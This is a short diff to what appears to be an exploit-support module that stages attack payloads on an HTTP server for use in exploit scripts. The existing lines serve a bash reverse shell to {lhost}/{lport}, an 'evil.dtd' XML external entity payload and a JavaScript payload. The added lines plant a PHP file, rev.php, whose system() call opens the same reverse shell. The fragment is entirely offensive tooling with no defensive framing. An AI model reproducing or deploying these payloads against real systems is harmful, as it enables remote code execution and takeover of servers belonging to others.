@@ -14,6 +14,9 @@ Usage (copy start_server, SERVED_FILES, EXFIL_DATA into your exploit script):
     shell_payload = f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
     SERVED_FILES["/shell.sh"] = (shell_payload, "text/x-shellscript")
 
+    rev_php = f\"""<?php system("bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"); ?>""\"
+    SERVED_FILES["/rev.php"] = (rev_php, "application/x-httpd-php")
+
     SERVED_FILES["/evil.dtd"] = (dtd_payload, "application/xml-dtd")
     SERVED_FILES["/payload.js"] = (js_payload, "application/javascript")
     
